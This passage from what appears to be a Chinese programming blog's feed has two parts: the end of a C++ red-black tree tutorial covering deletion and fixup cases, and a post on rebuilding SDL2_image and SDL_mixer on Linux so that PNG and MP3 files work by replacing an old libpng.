*uncle=gparent-&gt;leftChild;<br>            <span class="hljs-comment">// RLr/RRr型 叔叔节点是红色</span><br>            <span class="hljs-keyword">if</span> (uncle!=m_Nil &amp;&amp; uncle-&gt;color==RED)&#123;<br>                uncle-&gt;color=BLACK;<br>                parent-&gt;color=BLACK;<br>                gparent-&gt;color=RED;<br>                <span class="hljs-comment">// 继续向上调整</span><br>                pNode=gparent;<br>                <span class="hljs-keyword">continue</span>;<br>             <span class="hljs-comment">// RLb型 叔叔是黑色，且当前节点是左孩子</span><br>             <span class="hljs-comment">// 转化为 RRb</span><br>            &#125; <span class="hljs-keyword">if</span>(pNode==parent-&gt;leftChild)&#123;<br>                <span class="hljs-built_in">rightRotate</span>(parent);<br>            &#125;<br>            <span class="hljs-comment">// RRb型</span><br>            parent-&gt;color=BLACK;<br>            gparent-&gt;color=RED;<br>            <span class="hljs-built_in">leftRotate</span>(gparent);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 根节点必须为黑色！</span><br>    <span class="hljs-keyword">this</span>-&gt;m_RB_Root-&gt;color=BLACK;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="删除-2"><a class="markdownIt-Anchor" href="#删除-2"></a> 删除</h4>
<p>红黑树删除类似BST，删除操作的前半部分代码一样，差别在于删除后红黑树的修正。事实上删除操作的修正要十分复杂，要考虑的情况较多。</p>
<ul>
<li>在红黑树中查找该节点是否存在；</li>
<li>若存在左子树和右子树，寻找<code>前驱/后继节点</code>将其转化为<code>只有一个子树/叶子</code>情况；</li>
<li>根据<code>child节点</code>、<code>child的兄弟节点</code>、<code>child的父节点</code>修正删除后的红黑树；</li>
<li>删除该节点。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">RedBlackTree::Remove</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;<br>    RBNodeEntry *node=<span class="hljs-built_in">Search</span>(<span class="hljs-keyword">this</span>-&gt;m_RB_Root,key);<br>    <span class="hljs-keyword">if</span>(!node)<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    RBNodeEntry *child=m_Nil;<br>    RBNodeEntry *parent=<span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-comment">// 存在左子树和右子树，将其转化为只有一个子树/叶子情况</span><br>    <span class="hljs-keyword">if</span> (node-&gt;leftChild!=m_Nil &amp;&amp; node-&gt;rightChild!=m_Nil) &#123;<br>        <span class="hljs-comment">// 后继节点，即将是要被删除的节点</span><br>        RBNodeEntry *successor = <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">successor</span>(node);<br>        <span class="hljs-comment">// 数据替换</span><br>        node-&gt;key=successor-&gt;key;<br>        node-&gt;data=successor-&gt;data;<br>        <span class="hljs-comment">// 删除后继节点</span><br>        node=successor;<br>    &#125;<br>    <span class="hljs-comment">// 若node是叶子节点那么leftChild=rightChild=m_Nil</span><br>    <span class="hljs-keyword">if</span>(node-&gt;leftChild!=m_Nil)&#123;<br>        child=node-&gt;leftChild;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        child=node-&gt;rightChild;<br>    &#125;<br>    <span class="hljs-comment">// 即使child是Nil也要设置child的parent。因为removeFixup需要parent来修正</span><br>    child-&gt;parent=node-&gt;parent;<br><br>    <span class="hljs-comment">// 删除的是根节点</span><br>    <span class="hljs-keyword">if</span>(node-&gt;parent==<span class="hljs-literal">nullptr</span>)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;m_RB_Root=child;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(node-&gt;parent-&gt;leftChild==node)&#123;<br>        node-&gt;parent-&gt;leftChild=child;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        node-&gt;parent-&gt;rightChild=child;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(node-&gt;color==BLACK)&#123;<br>        <span class="hljs-built_in">RedBlack_removeFixup</span>(child);<br>    &#125;<br>    <span class="hljs-comment">// 直接删除节点即可</span><br>    <span class="hljs-keyword">delete</span> node;<br>    node=<span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>
<h4 id="removefixup"><a class="markdownIt-Anchor" href="#removefixup"></a> RemoveFixup</h4>
<p>给出下图的删除操作所引起的不平衡情况模板<br />
<img src="/uploads/images/data_structure/rbtree_cpp/31.png" alt="" /><br />
其中<code>白色节点</code>处于<code>未定型状态</code>，表示可以为黑/红/节点甚至Nil节点，但根节点一定是黑色节点。<code>节点u</code>表示删除节点的<code>child节点</code>。</p>
<p>我们首先讨论删除<code>黑色节点</code>的复杂情况。而且是上图的第一个模板，另一个也是类似的（旋转方向相反）。</p>
<h5 id="删除黑色节点"><a class="markdownIt-Anchor" href="#删除黑色节点"></a> 删除黑色节点</h5>
<p>删除黑色节点引起的不平衡大致有4种情况：</p>
<ul>
<li>Case1：<code>兄弟节点brother</code>为<code>红色</code>；</li>
<li>Case2：<code>兄弟节点brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>两个child</code>也都是黑色；</li>
<li>Case3：<code>兄弟节点brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>leftchild</code>是红色，<code>rightchild</code>是黑色；</li>
<li>Case4：<code>兄弟节点brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>rightchild</code>是红色。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/32.png" alt="" /></p>
<h6 id="case1"><a class="markdownIt-Anchor" href="#case1"></a> Case1</h6>
<p>这种情况下是<code>兄弟节点brother</code>为<code>红色</code>，那么<code>parent节点</code>一定黑色。修正过程为：</p>
<ul>
<li>将<code>兄弟节点brother</code>染成<code>黑色</code>；</li>
<li>将<code>u的父节点parent</code>染成<code>红色</code>；</li>
<li>对<code>parent</code>进行<code>左旋</code>；</li>
<li>移动<code>brother</code>到<code>u的父节点parent</code>的<code>右孩子rightchild</code>。</li>
</ul>
<p>注意，这种情况下修正还没有结束！<br />
<img src="/uploads/images/data_structure/rbtree_cpp/33.png" alt="" /></p>
<p>假设存在如下红黑树，删除节点a后为<code>case 1</code>情况，然而经过第一次修正发现并没有完全平衡，不过经过<code>case 1</code>却意外的进入了<code>case 2/3/4</code>，那么就继续修正。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/34.png" alt="" /></p>
<h6 id="case2"><a class="markdownIt-Anchor" href="#case2"></a> Case2</h6>
<p>这种情况是：<code>brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>两个child</code>也都是黑色。修正的方法如下：</p>
<ul>
<li>将<code>brother</code>染成<code>红色</code>；</li>
<li>移动<code>u</code>到其<code>父节点parent</code>；</li>
</ul>
<p>至此，再根据<code>u</code>(图中的<code>B</code>)的颜色可以分两种情况：</p>
<ul>
<li><code>u</code>是<code>红色</code>，结束修正同时把<code>u</code>染成<code>黑色</code>；</li>
<li><code>u</code>是<code>黑色且不是根节点root</code>，则继续下一轮修正过程，再根据不同情况进行修正。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/35.png" alt="" /></p>
<h6 id="case3"><a class="markdownIt-Anchor" href="#case3"></a> Case3</h6>
<p>这种情况是：<code>brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>leftchild</code>是红色，<code>rightchild</code>是黑色。修正的方法如下：</p>
<ul>
<li>将<code>brother</code>的<code>左孩子leftchild</code>染成<code>黑色</code>；</li>
<li>将<code>brother</code>染成<code>红色</code>；</li>
<li>对<code>brother</code>右旋；</li>
<li>移动<code>brother</code>到<code>u的父节点parent</code>的<code>右孩子rightchild</code>。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/36.png" alt="" /></p>
<h6 id="case4"><a class="markdownIt-Anchor" href="#case4"></a> Case4</h6>
<p>这是最后一种情况了：<code>brother</code>为<code>黑色</code>，而且<code>brother</code>的<code>rightchild</code>是红色。修正方法：</p>
<ul>
<li>将<code>brother</code>染成<code>u的父节点parent</code>的颜色(黑或红)；</li>
<li>将<code>parent</code>染成黑色；</li>
<li>将<code>brother</code>的<code>右孩子rightchild</code>染成黑色；</li>
<li>对<code>parent</code>左旋；</li>
<li>移动<code>u</code>移至<code>根节点root</code>，用于结束修正循环（图中节点b只是起演示作用，不一定为root）；</li>
<li>最后修改根节点root颜色为黑色。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/37.png" alt="" /></p>
<p>总结以上4种情况，它们之间的转化关系大概如下：</p>
<ul>
<li>Case1-&gt;Case2/3/4</li>
<li>Case3-&gt;Case4</li>
<li>Case1-&gt;Case3-&gt;Case4</li>
</ul>
<p>修正完Case4就说明红黑树平衡了</p>
<h6 id="case5"><a class="markdownIt-Anchor" href="#case5"></a> Case5</h6>
<p>其实这类情况最简单了，也就是删除一个<code>黑色节点p</code>，但其<code>子节点child</code>是一个<code>红色节点</code>，无论黑色节点p的父节点是黑色还是红色。这样的话根本没必要再去考虑上述4种情况了。</p>
<ul>
<li>删除黑色节点，如果存在<code>红色child节点</code>，那么将其染成<code>黑色</code>。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/38.png" alt="" /></p>
<h5 id="删除红色节点"><a class="markdownIt-Anchor" href="#删除红色节点"></a> 删除红色节点</h5>
<p>删除红色节点可能是删除叶子节点或者含有子树的节点。前者很容易实现，对于后者需要找到一个<code>前驱/后继节点</code>，而这个前驱/后继节点可能是黑色或红色的。如果是红色，那就删除该红色前驱/后继节点并向上修正直到平衡；如果是黑色，那么就判断不同的情况<code>case1/2/3/4/5</code>并进行修正；</p>
<p>删除红色节点55，前驱节点53也是红色节点<br />
<img src="/uploads/images/data_structure/rbtree_cpp/39.png" alt="" /></p>
<p>删除红色节点65，前驱节点60是黑色节点，需要进入<code>case3</code>和<code>case4</code>修正过程；<br />
删除红色节点65，后继节点67是红色节点。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/40.png" alt="" /></p>
<h5 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h5>
<p>为了说明情况，现在以下面这棵红黑树为例子来说明删除操作。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/41.png" alt="" /></p>
<p>删除<code>黑色节点55</code>，由于其子节点为<code>Nil</code>，故形成如下的<code>case4</code>：</p>
<ul>
<li>将<code>兄弟节点57</code>染成<code>u节点Nil</code>的<code>父节点56</code>的<code>红色</code>；</li>
<li>将<code>父节点56</code>染成<code>黑色</code>和<code>兄弟节点57</code>的<code>右节点58</code>染成<code>黑色</code>；</li>
<li>对<code>父节点56</code>左旋；</li>
<li>移动<code>u</code>移至根节点root，结束修正循环；</li>
<li>修改<code>根节点root</code>颜色为黑色。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/42.png" alt="" /><br />
最终效果<br />
<img src="/uploads/images/data_structure/rbtree_cpp/43.png" alt="" /><br />
删除<code>黑色节点58</code>，由于其子节点也为<code>Nil</code>，故形成如下的<code>case2</code>：</p>
<ul>
<li>将<code>兄弟节点56</code>染成<code>红色</code>；</li>
<li>移动<code>u</code>到其<code>父节点57</code>；</li>
<li>由于<code>u</code>是<code>红色</code>的，因此把<code>父节点57</code>染成<code>黑色</code>；</li>
<li>结束修正。</li>
</ul>
<p><img src="/uploads/images/data_structure/rbtree_cpp/44.png" alt="" /><br />
最终效果<br />
<img src="/uploads/images/data_structure/rbtree_cpp/45.png" alt="" /><br />
现在删除<code>黑色节点60</code>，由于其存在左右子树，因此需要寻找前驱/后继节点，此处寻找得<code>前驱黑色节点57</code>，替换<code>前驱黑色节点57</code>键值到<code>黑色节点60</code>。此时转化为删除<code>前驱黑色节点57</code>后形成<code>case5</code>，由于其<code>子节点56</code>为红色，故删除了<code>前驱黑色节点57</code>后，将<code>子节点56</code>染成<code>黑色</code>并结束修正。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/46.png" alt="" /></p>
<p>上述演示过程<br />
<img src="/uploads/images/data_structure/rbtree_cpp/47.gif" alt="" /></p>
<h5 id="c代码-2"><a class="markdownIt-Anchor" href="#c代码-2"></a> C++代码</h5>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">RedBlackTree::RedBlack_removeFixup</span><span class="hljs-params">(RBNodeEntry*node)</span> </span>&#123;<br>    <span class="hljs-comment">// case5:</span><br>    <span class="hljs-comment">// 若node是红色，那么把子节点node直接染黑</span><br>    <span class="hljs-comment">// 若node是root，那么也把它直接染黑</span><br>    <span class="hljs-keyword">while</span> (node!=m_RB_Root &amp;&amp; node-&gt;color==BLACK) &#123;<br>        <span class="hljs-comment">// node是左节点</span><br>        <span class="hljs-keyword">if</span> (node==node-&gt;parent-&gt;leftChild) &#123;<br>            RBNodeEntry *brother=node-&gt;parent-&gt;rightChild;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            case1:</span><br><span class="hljs-comment">            case1最终转化为case2/3/4</span><br><span class="hljs-comment">                1.将兄弟节点brother染成黑色；</span><br><span class="hljs-comment">                2.将node的父节点parent染成红色；</span><br><span class="hljs-comment">                3.对parent进行左旋；</span><br><span class="hljs-comment">                4.移动brother到node的父节点parent的右孩子rightchild。</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-keyword">if</span>(brother-&gt;color==RED)&#123;<br>                brother-&gt;color=BLACK;<br>                node-&gt;parent-&gt;color=RED;<br>                <span class="hljs-built_in">leftRotate</span>(node-&gt;parent);<br>                brother=node-&gt;parent-&gt;rightChild;<br>            &#125;<br>            <br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            case2:(单独处理)</span><br><span class="hljs-comment">                1.将brother染成红色；</span><br><span class="hljs-comment">                2.移动node到其父节点parent；</span><br><span class="hljs-comment">            */</span>    <br>            <span class="hljs-keyword">if</span>(brother-&gt;leftChild-&gt;color==BLACK&amp;&amp;brother-&gt;rightChild-&gt;color==BLACK)&#123;<br>                brother-&gt;color=RED;<br>                node=node-&gt;parent;<br>            &#125;<br>            <span class="hljs-comment">// case3-&gt;case4</span><br>            <span class="hljs-keyword">else</span> &#123;   <br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                case3:</span><br><span class="hljs-comment">                    1.将brother的左孩子leftchild染成黑色；</span><br><span class="hljs-comment">                    2.将brother染成红色；</span><br><span class="hljs-comment">                    3.对brother右旋；</span><br><span class="hljs-comment">                    4.移动brother到node的父节点parent的右孩子rightchild。</span><br><span class="hljs-comment">                */</span><br>                <span class="hljs-keyword">if</span>(brother-&gt;rightChild-&gt;color==BLACK)&#123;<br>                    brother-&gt;leftChild-&gt;color=BLACK;<br>                    brother-&gt;color=RED;<br>                    <span class="hljs-built_in">rightRotate</span>(brother);<br>                    brother=node-&gt;parent-&gt;rightChild;<br>                &#125;<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                case4:</span><br><span class="hljs-comment">                    1.将brother染成node的父节点parent的颜色(黑或红)；</span><br><span class="hljs-comment">                    2.将parent染成黑色；</span><br><span class="hljs-comment">                    3.将brother的右孩子rightchild染成黑色；</span><br><span class="hljs-comment">                    4.对parent左旋；</span><br><span class="hljs-comment">                    5.移动node移至根节点root，用于结束修正循环。</span><br><span class="hljs-comment">                */</span><br>                brother-&gt;color=node-&gt;parent-&gt;color;<br>                node-&gt;parent-&gt;color=BLACK;<br>                brother-&gt;rightChild-&gt;color=BLACK;<br>                <span class="hljs-built_in">leftRotate</span>(node-&gt;parent);<br>                node=<span class="hljs-keyword">this</span>-&gt;m_RB_Root;<br>            &#125;<br>        <span class="hljs-comment">// node是右节点</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            RBNodeEntry *brother=node-&gt;parent-&gt;leftChild;<br>            <span class="hljs-comment">// case1-&gt;case2/3/4:</span><br>            <span class="hljs-keyword">if</span> (brother-&gt;color == RED) &#123;<br>                brother-&gt;color = BLACK;<br>                node-&gt;parent-&gt;color = RED;<br>                <span class="hljs-built_in">rightRotate</span>(node-&gt;parent);<br>                brother = node-&gt;parent-&gt;leftChild;<br>            &#125;<br>            <span class="hljs-comment">// case2:</span><br>            <span class="hljs-keyword">if</span> (brother-&gt;leftChild-&gt;color == BLACK&amp;&amp;brother-&gt;rightChild-&gt;color == BLACK) &#123;<br>                brother-&gt;color = RED;<br>                node = node-&gt;parent;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// case3:</span><br>                <span class="hljs-keyword">if</span> (brother-&gt;leftChild-&gt;color == BLACK)&#123;<br>                    brother-&gt;rightChild-&gt;color = BLACK;<br>                    brother-&gt;color = RED;<br>                    <span class="hljs-built_in">leftRotate</span>(brother);<br>                    brother = node-&gt;parent-&gt;leftChild;<br>                &#125;<br>                <span class="hljs-comment">// case4: </span><br>                brother-&gt;color = node-&gt;parent-&gt;color;<br>                node-&gt;parent-&gt;color = BLACK;<br>                brother-&gt;leftChild-&gt;color = BLACK;<br>                <span class="hljs-built_in">rightRotate</span>(node-&gt;parent);<br>                node = <span class="hljs-keyword">this</span>-&gt;m_RB_Root;<br>            &#125;<br>        &#125; <br>    &#125;<br>    <span class="hljs-comment">// 即使node是Nil也染黑</span><br>    node-&gt;color=BLACK;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h4 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h4>
<p>红黑树实在是太复杂了，还得慢慢来～关于红黑树和AVL树差别，可以看看 <a href="https://stackoverflow.com/questions/13852870/red-black-tree-over-avl-tree">https://stackoverflow.com/questions/13852870/red-black-tree-over-avl-tree</a><br />
篇幅有限，红黑树全部源码就不全放出来了，毕竟也参考了别人写的，仅供学习罢了～<br />
有兴趣的可以去看看本文红黑树大概实现源码：<a href="https://josephxrays.coding.net/p/rbt_cpp_learn/d/rbt_cpp_learn/git">源码链接</a></p>
<p>总之，红黑树上红黑果，红黑树下你和我～</p>
<p>bye~</p>
<h4 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h4>
<p><a href="https://zh.wikipedia.org/zh-hans/%E7%BA%A2%E9%BB%91%E6%A0%91">红黑树-维基百科</a><br />
<a href="http://alrightchiu.github.io/SecondRound/red-black-tree-introjian-jie.html">Red Black Tree: Intro(簡介)</a><br />
<a href="https://riteme.site/blog/2016-3-12/2-3-tree-and-red-black-tree.html">2-3树与红黑树</a><br />
《数据结构、算法与应用 C++语言描述》</p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
        <tag>红黑树</tag>
      </tags>
  </entry>
  <entry>
    <title>SDL2显示PNG图片+播放MP3</title>
    <url>/sdl2-png-mp3/</url>
    <content><![CDATA[<p>在使用SDL时，发现就算编译安装了SDL2_image和SDL_mixer也无法显示png格式图片和播放MP3音频文件。在网上搜索许久，这里总结一下编译过程。。。</p>
<span id="more"></span>
<h3 id="sdl2_image"><a class="markdownIt-Anchor" href="#sdl2_image"></a> SDL2_image</h3>
<p>首先，我是用一下函数获取错误的信息的</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++">_texture=<span class="hljs-built_in">IMG_LoadTexture</span>(_renderer,filename.<span class="hljs-built_in">c_str</span>());<br>cout&lt;&lt; <span class="hljs-built_in">SDL_GetError</span>()&lt;&lt;endl;<br></code></pre></div></td></tr></table></figure>
<p>错误信息如下：<br />
Failed loading <strong>png_set_longjmp_fn</strong>: /lib/x86_64-linux-gnu/libpng12.so.0: <strong>undefined symbol</strong>: <strong>_png_set_longjmp_fn</strong></p>
<p>可看到，<a href="http://libpng12.so">libpng12.so</a> 这个库文件位定义函数符号 <strong>png_set_longjmp_fn</strong></p>
<p>接着我查找 <strong><a href="http://libpng12.so">libpng12.so</a></strong> 这个库文件</p>
<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">$ locate libpng|<span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;so&quot;</span><br><span class="hljs-regexp">/lib/</span>x86_64-linux-gnu/libpng12.so.<span class="hljs-number">0</span><br><span class="hljs-regexp">/lib/</span>x86_64-linux-gnu/libpng12.so.<span class="hljs-number">0.49</span>.<span class="hljs-number">0</span><br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/x86_64-linux-gnu/</span>libpng.so<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/x86_64-linux-gnu/</span>libpng16.so<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/x86_64-linux-gnu/</span>libpng16.so.<span class="hljs-number">16</span><br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/x86_64-linux-gnu/</span>libpng16.so.<span class="hljs-number">16.34</span>.<span class="hljs-number">0</span><br><br></code></pre></div></td></tr></table></figure>
<p>可看到系统存在两个版本的 <strong>libpng</strong> 库 。如果只存在一个，那么可以自行下载libpng最新版本编译安装，并继续以下操作。<br />
其中 <strong>libpng12.so.0.49.0</strong> 是一个比较老的版本了。所以与最新的SDL2可能不兼容，才会出现上面的那个错误。知道的问题后，解决起来似乎也变得简单了。。。</p>
<ul>
<li>
<p>显示12版本 dynamic symbols</p>
<blockquote>
<p>$ nm -D /lib/x86_64-linux-gnu/libpng12.so.0|grep png_set_longjmp_fn</p>
</blockquote>
</li>
<li>
<p>显示16版本 dynamic symbols</p>
<blockquote>
<p>$ nm -D /usr/lib/x86_64-linux-gnu/libpng.so|grep png_set_longjmp_fn<br />
结果：000000000000a840 T <strong>png_set_longjmp_fn</strong></p>
</blockquote>
</li>
</ul>
<p>所以，解决方法很简单，删除旧的库文件，替换成新的。不过最后我发现了一个奇怪的问题，那就是在从 /lib/x86_64-linux-gnu 路径去除libpng12.so.0这个旧版本的库时，virtualbox虚拟机启动显示 <strong>创建COM对象失败</strong> 。最后重新编译安装了libpng12.so.0并复制到 /lib/x86_64-linux-gnu 目录下才可以！</p>
<blockquote>
<p>cp /usr/lib/x86_64-linux-gnu/<strong>libpng16.so.16.34.0</strong> /lib/x86_64-linux-gnu/<br />
ln -s /lib/x86_64-linux-gnu/<strong>libpng16.so.16.34.0</strong> /lib/x86_64-linux-gnu/<strong><a href="http://libpng16.so">libpng16.so</a></strong> #添加软链接</p>
</blockquote>
<p>之后重新编译 SDL2_image</p>
<blockquote>
<p>./configure<br />
make<br />
make install</p>
</blockquote>
<h3 id="sdl_mixer"><a class="markdownIt-Anchor" href="#sdl_mixer"></a> SDL_mixer</h3>
<p>通过 ./configure --help 查看配置选项。要想支持播放MP3格式，只需添加以下配置参数</p>
<blockquote>
<p>./configure –<strong>enable-music-mp3</strong> –<strong>enable-music-mp3-mad-gpl</strong><br />
make<br />
make insatll</p>
</blockquote>
<p>ldd build/.libs/libSDL2_mixer.so</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">linux-vdso.so.<span class="hljs-number">1</span> (<span class="hljs-number">0</span>x00007ffc71f8d000)<br>libSDL2-<span class="hljs-number">2.0</span>.so.<span class="hljs-number">0</span> =&gt; <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>libSDL2-<span class="hljs-number">2.0</span>.so.<span class="hljs-number">0</span> (<span class="hljs-number">0</span>x00007f07ed821000)<br>libdl.so.<span class="hljs-number">2</span> =&gt; <span class="hljs-regexp">/lib/</span>x86_64-linux-gnu/libdl.so.<span class="hljs-number">2</span> (<span class="hljs-number">0</span>x00007f07ed5f2000)<br>libpthread.so.<span class="hljs-number">0</span> =&gt; <span class="hljs-regexp">/lib/</span>x86_64-linux-gnu/libpthread.so.<span class="hljs-number">0</span> (<span class="hljs-number">0</span>x00007f07ed3d4000)<br>librt.so.<span class="hljs-number">1</span> =&gt; <span class="hljs-regexp">/lib/</span>x86_64-linux-gnu/librt.so.<span class="hljs-number">1</span> (<span class="hljs-number">0</span>x00007f07ed1cc000)<br>libmad.so.<span class="hljs-number">0</span> =&gt; <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/x86_64-linux-gnu/</span>libmad.so.<span class="hljs-number">0</span> (<span class="hljs-number">0</span>x00007f07ecfac000)<br>libm.so.<span class="hljs-number">6</span> =&gt; <span class="hljs-regexp">/lib/</span>x86_64-linux-gnu/libm.so.<span class="hljs-number">6</span> (<span class="hljs-number">0</span>x00007f07ecc99000)<br>libc.so.<span class="hljs-number">6</span> =&gt; <span class="hljs-regexp">/lib/</span>x86_64-linux-gnu/libc.so.<span class="hljs-number">6</span> (<span class="hljs-number">0</span>x00007f07ec8f4000)<br><span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span> (<span class="hljs-number">0</span>x0000557697c43000)<br></code></pre></div></td></tr></table></figure>
<p>这样就OK了 😃</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>C</tag>
        <tag>SDL2</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-跳跃表C++实现</title>
    <url>/skiplist-cpp/</url>
    <content><![CDATA[<p>跳跃表/跳表(SkipList)<br />
